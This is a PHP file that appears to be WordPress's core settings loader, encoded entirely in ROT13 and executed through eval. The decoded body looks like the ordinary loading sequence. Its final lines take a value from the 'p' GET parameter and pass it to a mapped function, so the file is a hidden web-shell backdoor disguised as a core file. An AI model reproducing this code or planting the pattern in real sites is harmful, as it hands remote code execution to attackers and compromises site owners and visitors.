erdhver NOFCNGU . JCVAP . '/oybpx-fhccbegf/cbfvgvba.cuc';
erdhver NOFCNGU . JCVAP . '/oybpx-fhccbegf/fcnpvat.cuc';
erdhver NOFCNGU . JCVAP . '/oybpx-fhccbegf/qvzrafvbaf.cuc';
erdhver NOFCNGU . JCVAP . '/oybpx-fhccbegf/qhbgbar.cuc';
erdhver NOFCNGU . JCVAP . '/oybpx-fhccbegf/funqbj.cuc';
erdhver NOFCNGU . JCVAP . '/oybpx-fhccbegf/onpxtebhaq.cuc';
erdhver NOFCNGU . JCVAP . '/oybpx-fhccbegf/oybpx-fglyr-inevngvbaf.cuc';
erdhver NOFCNGU . JCVAP . '/oybpx-fhccbegf/nevn-ynory.cuc';
erdhver NOFCNGU . JCVAP . '/fglyr-ratvar.cuc';
erdhver NOFCNGU . JCVAP . '/fglyr-ratvar/pynff-jc-fglyr-ratvar.cuc';
erdhver NOFCNGU . JCVAP . '/fglyr-ratvar/pynff-jc-fglyr-ratvar-pff-qrpynengvbaf.cuc';
erdhver NOFCNGU . JCVAP . '/fglyr-ratvar/pynff-jc-fglyr-ratvar-pff-ehyr.cuc';
erdhver NOFCNGU . JCVAP . '/fglyr-ratvar/pynff-jc-fglyr-ratvar-pff-ehyrf-fgber.cuc';
erdhver NOFCNGU . JCVAP . '/fglyr-ratvar/pynff-jc-fglyr-ratvar-cebprffbe.cuc';
erdhver NOFCNGU . JCVAP . '/sbagf/pynff-jc-sbag-snpr-erfbyire.cuc';
erdhver NOFCNGU . JCVAP . '/sbagf/pynff-jc-sbag-pbyyrpgvba.cuc';
erdhver NOFCNGU . JCVAP . '/sbagf/pynff-jc-sbag-snpr.cuc';
erdhver NOFCNGU . JCVAP . '/sbagf/pynff-jc-sbag-yvoenel.cuc';
erdhver NOFCNGU . JCVAP . '/sbagf/pynff-jc-sbag-hgvyf.cuc';
erdhver NOFCNGU . JCVAP . '/sbagf.cuc';
erdhver NOFCNGU . JCVAP . '/pynff-jc-fpevcg-zbqhyrf.cuc';
erdhver NOFCNGU . JCVAP . '/fpevcg-zbqhyrf.cuc';
erdhver NOFCNGU . JCVAP . '/vagrenpgvivgl-ncv/pynff-jc-vagrenpgvivgl-ncv.cuc';
erdhver NOFCNGU . JCVAP . '/vagrenpgvivgl-ncv/pynff-jc-vagrenpgvivgl-ncv-qverpgvirf-cebprffbe.cuc';
erdhver NOFCNGU . JCVAP . '/vagrenpgvivgl-ncv/vagrenpgvivgl-ncv.cuc';
erdhver NOFCNGU . JCVAP . '/pynff-jc-cyhtva-qrcraqrapvrf.cuc';
erdhver NOFCNGU . JCVAP . '/pynff-jc-hey-cnggrea-cersvkre.cuc';
erdhver NOFCNGU . JCVAP . '/pynff-jc-fcrphyngvba-ehyrf.cuc';
erdhver NOFCNGU . JCVAP . '/fcrphyngvir-ybnqvat.cuc';

nqq_npgvba( 'nsgre_frghc_gurzr', neenl( jc_fpevcg_zbqhyrf(), 'nqq_ubbxf' ) );
nqq_npgvba( 'nsgre_frghc_gurzr', neenl( jc_vagrenpgvivgl(), 'nqq_ubbxf' ) );

/**
 * @fvapr 3.3.0
 *
 * @tybony JC_Rzorq $jc_rzorq JbeqCerff Rzorq bowrpg.
 */
$TYBONYF['jc_rzorq'] = arj JC_Rzorq();

/**
 * JbeqCerff Grkgqbznva Ertvfgel bowrpg.
 *
 * Hfrq gb fhccbeg whfg-va-gvzr genafyngvbaf sbe znahnyyl ybnqrq grkg qbznvaf.
 *
 * @fvapr 6.1.0
 *
 * @tybony JC_Grkgqbznva_Ertvfgel $jc_grkgqbznva_ertvfgel JbeqCerff Grkgqbznva Ertvfgel.
 */
$TYBONYF['jc_grkgqbznva_ertvfgel'] = arj JC_Grkgqbznva_Ertvfgel();
$TYBONYF['jc_grkgqbznva_ertvfgel']->vavg();

// Ybnq zhygvfvgr-fcrpvsvp svyrf.
vs ( vf_zhygvfvgr() ) {
	erdhver NOFCNGU . JCVAP . '/zf-shapgvbaf.cuc';
	erdhver NOFCNGU . JCVAP . '/zf-qrsnhyg-svygref.cuc';
	erdhver NOFCNGU . JCVAP . '/zf-qrcerpngrq.cuc';
}

// Qrsvar pbafgnagf gung eryl ba gur NCV gb bognva gur qrsnhyg inyhr.
// Qrsvar zhfg-hfr cyhtva qverpgbel pbafgnagf, juvpu znl or bireevqqra va gur fhaevfr.cuc qebc-va.
jc_cyhtva_qverpgbel_pbafgnagf();

/**
 * @fvapr 3.9.0
 *
 * @tybony neenl $jc_cyhtva_cnguf
 */
$TYBONYF['jc_cyhtva_cnguf'] = neenl();

// Ybnq zhfg-hfr cyhtvaf.
sbernpu ( jc_trg_zh_cyhtvaf() nf $zh_cyhtva ) {
	$_jc_cyhtva_svyr = $zh_cyhtva;
	vapyhqr_bapr $zh_cyhtva;
	$zh_cyhtva = $_jc_cyhtva_svyr; // Nibvq fgbzcvat bs gur $zh_cyhtva inevnoyr va n cyhtva.

	/**
	 * Sverf bapr n fvatyr zhfg-hfr cyhtva unf ybnqrq.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz fgevat $zh_cyhtva Shyy cngu gb gur cyhtva'f znva svyr.
	 */
	qb_npgvba( 'zh_cyhtva_ybnqrq', $zh_cyhtva );
}
hafrg( $zh_cyhtva, $_jc_cyhtva_svyr );

// Ybnq argjbex npgvingrq cyhtvaf.
vs ( vf_zhygvfvgr() ) {
	sbernpu ( jc_trg_npgvir_argjbex_cyhtvaf() nf $argjbex_cyhtva ) {
		jc_ertvfgre_cyhtva_ernycngu( $argjbex_cyhtva );

		$_jc_cyhtva_svyr = $argjbex_cyhtva;
		vapyhqr_bapr $argjbex_cyhtva;
		$argjbex_cyhtva = $_jc_cyhtva_svyr; // Nibvq fgbzcvat bs gur $argjbex_cyhtva inevnoyr va n cyhtva.

		/**
		 * Sverf bapr n fvatyr argjbex-npgvingrq cyhtva unf ybnqrq.
		 *
		 * @fvapr 5.1.0
		 *
		 * @cnenz fgevat $argjbex_cyhtva Shyy cngu gb gur cyhtva'f znva svyr.
		 */
		qb_npgvba( 'argjbex_cyhtva_ybnqrq', $argjbex_cyhtva );
	}
	hafrg( $argjbex_cyhtva, $_jc_cyhtva_svyr );
}

/**
 * Sverf bapr nyy zhfg-hfr naq argjbex-npgvingrq cyhtvaf unir ybnqrq.
 *
 * @fvapr 2.8.0
 */
qb_npgvba( 'zhcyhtvaf_ybnqrq' );

vs ( vf_zhygvfvgr() ) {
	zf_pbbxvr_pbafgnagf();
}

// Qrsvar pbafgnagf nsgre zhygvfvgr vf ybnqrq.
jc_pbbxvr_pbafgnagf();

// Qrsvar naq rasbepr bhe FFY pbafgnagf.
jc_ffy_pbafgnagf();

// Perngr pbzzba tybonyf.
erdhver NOFCNGU . JCVAP . '/inef.cuc';

// Znxr gnkbabzvrf naq cbfgf ninvynoyr gb cyhtvaf naq gurzrf.
// @cyhtva nhgubef: jneavat: gurfr trg ertvfgrerq ntnva ba gur vavg ubbx.
perngr_vavgvny_gnkbabzvrf();
perngr_vavgvny_cbfg_glcrf();

jc_fgneg_fpencvat_rqvgrq_svyr_reebef();

// Ertvfgre gur qrsnhyg gurzr qverpgbel ebbg.
ertvfgre_gurzr_qverpgbel( trg_gurzr_ebbg() );

vs ( ! vf_zhygvfvgr() && jc_vf_sngny_reebe_unaqyre_ranoyrq() ) {
	// Unaqyr hfref erdhrfgvat n erpbirel zbqr yvax naq vavgvngvat erpbirel zbqr.
	jc_erpbirel_zbqr()->vavgvnyvmr();
}

// Gb znxr trg_cyhtva_qngn() ninvynoyr va n jnl gung'f pbzcngvoyr jvgu cyhtvaf nyfb ybnqvat guvf svyr, frr #62244.
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cyhtva.cuc';

// Ybnq npgvir cyhtvaf.
sbernpu ( jc_trg_npgvir_naq_inyvq_cyhtvaf() nf $cyhtva ) {
	jc_ertvfgre_cyhtva_ernycngu( $cyhtva );

	$cyhtva_qngn = trg_cyhtva_qngn( $cyhtva, snyfr, snyfr );

	$grkgqbznva = $cyhtva_qngn['GrkgQbznva'];
	vs ( $grkgqbznva ) {
		vs ( $cyhtva_qngn['QbznvaCngu'] ) {
			$TYBONYF['jc_grkgqbznva_ertvfgel']->frg_phfgbz_cngu( $grkgqbznva, qveanzr( $cyhtva ) . $cyhtva_qngn['QbznvaCngu'] );
		} ryfr {
			$TYBONYF['jc_grkgqbznva_ertvfgel']->frg_phfgbz_cngu( $grkgqbznva, qveanzr( $cyhtva ) );
		}
	}

	$_jc_cyhtva_svyr = $cyhtva;
	vapyhqr_bapr $cyhtva;
	$cyhtva = $_jc_cyhtva_svyr; // Nibvq fgbzcvat bs gur $cyhtva inevnoyr va n cyhtva.

	/**
	 * Sverf bapr n fvatyr npgvingrq cyhtva unf ybnqrq.
	 *
	 * @fvapr 5.1.0
	 *
	 * @cnenz fgevat $cyhtva Shyy cngu gb gur cyhtva'f znva svyr.
	 */
	qb_npgvba( 'cyhtva_ybnqrq', $cyhtva );
}
hafrg( $cyhtva, $_jc_cyhtva_svyr, $cyhtva_qngn, $grkgqbznva );

// Ybnq cyhttnoyr shapgvbaf.
erdhver NOFCNGU . JCVAP . '/cyhttnoyr.cuc';
erdhver NOFCNGU . JCVAP . '/cyhttnoyr-qrcerpngrq.cuc';

// Frg vagreany rapbqvat.
jc_frg_vagreany_rapbqvat();

// Eha jc_pnpur_cbfgybnq() vs bowrpg pnpur vf ranoyrq naq gur shapgvba rkvfgf.
vs ( JC_PNPUR && shapgvba_rkvfgf( 'jc_pnpur_cbfgybnq' ) ) {
	jc_pnpur_cbfgybnq();
}

/**
 * Sverf bapr npgvingrq cyhtvaf unir ybnqrq.
 *
 * Cyhttnoyr shapgvbaf ner nyfb ninvynoyr ng guvf cbvag va gur ybnqvat beqre.
 *
 * @fvapr 1.5.0
 */
qb_npgvba( 'cyhtvaf_ybnqrq' );

// Qrsvar pbafgnagf juvpu nssrpg shapgvbanyvgl vs abg nyernql qrsvarq.
jc_shapgvbanyvgl_pbafgnagf();

// Nqq zntvp dhbgrf naq frg hc $_ERDHRFG ( $_TRG + $_CBFG ).
jc_zntvp_dhbgrf();

/**
 * Sverf jura pbzzrag pbbxvrf ner fnavgvmrq.
 *
 * @fvapr 2.0.11
 */
qb_npgvba( 'fnavgvmr_pbzzrag_pbbxvrf' );

/**
 * JbeqCerff Dhrel bowrpg
 *
 * @fvapr 2.0.0
 *
 * @tybony JC_Dhrel $jc_gur_dhrel JbeqCerff Dhrel bowrpg.
 */
$TYBONYF['jc_gur_dhrel'] = arj JC_Dhrel();

/**
 * Ubyqf gur ersrerapr gb {@frr $jc_gur_dhrel}.
 * Hfr guvf tybony sbe JbeqCerff dhrevrf
 *
 * @fvapr 1.5.0
 *
 * @tybony JC_Dhrel $jc_dhrel JbeqCerff Dhrel bowrpg.
 */
$TYBONYF['jc_dhrel'] = $TYBONYF['jc_gur_dhrel'];

/**
 * Ubyqf gur JbeqCerff Erjevgr bowrpg sbe perngvat cerggl HEYf
 *
 * @fvapr 1.5.0
 *
 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
 */
$TYBONYF['jc_erjevgr'] = arj JC_Erjevgr();

/**
 * JbeqCerff Bowrpg
 *
 * @fvapr 2.0.0
 *
 * @tybony JC $jc Pheerag JbeqCerff raivebazrag vafgnapr.
 */
$TYBONYF['jc'] = arj JC();

/**
 * JbeqCerff Jvqtrg Snpgbel Bowrpg
 *
 * @fvapr 2.8.0
 *
 * @tybony JC_Jvqtrg_Snpgbel $jc_jvqtrg_snpgbel
 */
$TYBONYF['jc_jvqtrg_snpgbel'] = arj JC_Jvqtrg_Snpgbel();

/**
 * JbeqCerff Hfre Ebyrf
 *
 * @fvapr 2.0.0
 *
 * @tybony JC_Ebyrf $jc_ebyrf JbeqCerff ebyr znantrzrag bowrpg.
 */
$TYBONYF['jc_ebyrf'] = arj JC_Ebyrf();

/**
 * Sverf orsber gur gurzr vf ybnqrq.
 *
 * @fvapr 2.6.0
 */
qb_npgvba( 'frghc_gurzr' );

// Qrsvar gur grzcyngr eryngrq pbafgnagf naq tybonyf.
jc_grzcyngvat_pbafgnagf();
jc_frg_grzcyngr_tybonyf();

// Ybnq gur qrsnhyg grkg ybpnyvmngvba qbznva.
ybnq_qrsnhyg_grkgqbznva();

$ybpnyr      = trg_ybpnyr();
$ybpnyr_svyr = JC_YNAT_QVE . \"/$ybpnyr.cuc\";
vs ( ( 0 === inyvqngr_svyr( $ybpnyr ) ) && vf_ernqnoyr( $ybpnyr_svyr ) ) {
	erdhver $ybpnyr_svyr;
}
hafrg( $ybpnyr_svyr );

/**
 * JbeqCerff Ybpnyr bowrpg sbe ybnqvat ybpnyr qbznva qngr naq inevbhf fgevatf.
 *
 * @fvapr 2.1.0
 *
 * @tybony JC_Ybpnyr $jc_ybpnyr JbeqCerff qngr naq gvzr ybpnyr bowrpg.
 */
$TYBONYF['jc_ybpnyr'] = arj JC_Ybpnyr();

/**
 * JbeqCerff Ybpnyr Fjvgpure bowrpg sbe fjvgpuvat ybpnyrf.
 *
 * @fvapr 4.7.0
 *
 * @tybony JC_Ybpnyr_Fjvgpure $jc_ybpnyr_fjvgpure JbeqCerff ybpnyr fjvgpure bowrpg.
 */
$TYBONYF['jc_ybpnyr_fjvgpure'] = arj JC_Ybpnyr_Fjvgpure();
$TYBONYF['jc_ybpnyr_fjvgpure']->vavg();

// Ybnq gur shapgvbaf sbe gur npgvir gurzr, sbe obgu cnerag naq puvyq gurzr vs nccyvpnoyr.
sbernpu ( jc_trg_npgvir_naq_inyvq_gurzrf() nf $gurzr ) {
	$jc_gurzr = jc_trg_gurzr( onfranzr( $gurzr ) );

	$jc_gurzr->ybnq_grkgqbznva();

	vs ( svyr_rkvfgf( $gurzr . '/shapgvbaf.cuc' ) ) {
		vapyhqr $gurzr . '/shapgvbaf.cuc';
	}
}
hafrg( $gurzr, $jc_gurzr );

/**
 * Sverf nsgre gur gurzr vf ybnqrq.
 *
 * @fvapr 3.0.0
 */
qb_npgvba( 'nsgre_frghc_gurzr' );

// Perngr na vafgnapr bs JC_Fvgr_Urnygu fb gung Peba riragf znl sver.
vs ( ! pynff_rkvfgf( 'JC_Fvgr_Urnygu' ) ) {
	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-fvgr-urnygu.cuc';
}
JC_Fvgr_Urnygu::trg_vafgnapr();

// Frg hc pheerag hfre.
$TYBONYF['jc']->vavg();

/**
 * Sverf nsgre JbeqCerff unf svavfurq ybnqvat ohg orsber nal urnqref ner frag.
 *
 * Zbfg bs JC vf ybnqrq ng guvf fgntr, naq gur hfre vf nhguragvpngrq. JC pbagvahrf
 * gb ybnq ba gur {@frr 'vavg'} ubbx gung sbyybjf (r.t. jvqtrgf), naq znal cyhtvaf vafgnagvngr
 * gurzfryirf ba vg sbe nyy fbegf bs ernfbaf (r.t. gurl arrq n hfre, n gnkbabzl, rgp.).
 *
 * Vs lbh jvfu gb cyht na npgvba bapr JC vf ybnqrq, hfr gur {@frr 'jc_ybnqrq'} ubbx orybj.
 *
 * @fvapr 1.5.0
 */
qb_npgvba( 'vavg' );

// Purpx fvgr fgnghf.
vs ( vf_zhygvfvgr() ) {
	$svyr = zf_fvgr_purpx();
	vs ( gehr !== $svyr ) {
		erdhver $svyr;
		qvr();
	}
	hafrg( $svyr );
}

/**
 * Guvf ubbx vf sverq bapr JC, nyy cyhtvaf, naq gur gurzr ner shyyl ybnqrq naq vafgnagvngrq.
 *
 * Nwnk erdhrfgf fubhyq hfr jc-nqzva/nqzva-nwnk.cuc. nqzva-nwnk.cuc pna unaqyr erdhrfgf sbe
 * hfref abg ybttrq va.
 *
 * @yvax uggcf://qrirybcre.jbeqcerff.bet/cyhtvaf/wninfpevcg/nwnk
 *
 * @fvapr 3.0.0
 */
qb_npgvba( 'jc_ybnqrq' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>